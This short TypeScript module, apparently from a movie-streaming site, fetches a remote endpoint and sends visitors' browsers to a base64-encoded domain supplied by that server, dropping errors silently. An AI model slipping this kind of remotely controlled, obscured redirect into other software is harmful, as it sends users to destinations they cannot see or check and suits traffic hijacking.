import { isAllowedHost } from '../utils/domain-check';
import { getHostsByKey } from '../utils/remote-domains';

const KEY = 'prmovies-redirect';
const API_URL = 'https://rep.prmovies3.online/api/get';

export function initPrmoviesRedirect(): void {
  if (!isAllowedHost(getHostsByKey(KEY))) return;
  fetch(`${API_URL}?v=${Date.now()}`, { cache: 'no-store' })
    .then((r) => r.json())
    .then((data: { key?: string } | null) => {
      if (data?.key) window.location.href = `https://${atob(data.key)}`;
    })
    .catch(() => {});
}
